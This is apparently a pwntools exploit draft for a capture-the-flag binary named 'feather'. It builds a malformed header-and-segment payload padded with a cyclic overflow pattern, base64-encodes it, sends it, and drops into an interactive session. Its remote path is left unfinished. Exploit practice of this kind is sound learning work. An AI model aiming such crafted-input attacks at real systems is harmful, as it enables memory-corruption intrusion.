#!/usr/bin/env python3

from pwn import *
from base64 import b64encode


_FILE = "./feather"
binary = context.binary = ELF(_FILE, checksec=False)

env = {"LD_PRELOAD": "./libc-2.31.so"}

if args.REMOTE:
    _LIBC = ELF("./libc-2.31.so")
    p = remote()
elif args.GDB:
    _LIBC = binary.libc
    p = gdb.debug(binary.path, gdbscript="\nb 265\nb 267\nc\n")
else:
    p = process(binary.path)



def get_header(seg: int):
    magic = p64(0x52454854414546)
    num_segments = p32(seg)
    return magic + num_segments

def get_segment(t: int, i: int, o: int, l: int):
    Type = p32(t)
    Id = p32(i)
    offset = p32(o)
    length = p32(l)
    return Type + Id + offset + length

def get_type_desc(name_len: bytes, num_entries: bytes):
    return p32(name_len) + p32(num_entries)

## interactive functions ##

def send_feather(b: bytes):
    p.recvuntil("newlines:\n")
    p.sendline(b)
    p.sendline()
    return p.clean().decode("latin-1")

Segment_Type = {
        "Directory": 0,
        "File": 1,
        "File_Clone": 2,
        "Symlink": 3,
        "Hardlink": 4,
        "Label": 5,
};

seg_size = 10
header = get_header(seg_size)

segments = b""

segments += get_segment(Segment_Type['Directory'], 0x539, 8, 8) 
for i in range(seg_size-1):
    segments += get_segment(Segment_Type['Symlink'], i+10, 8, 8)

files = b""
files += get_type_desc(8, 8)
for j in range(seg_size-1):
    files += get_type_desc(8, 8)

extra = cyclic(1000, n=8)
content = files + extra

payload = header + segments + files + content
payload = b64encode(payload)

print(send_feather(payload))

p.interactive()
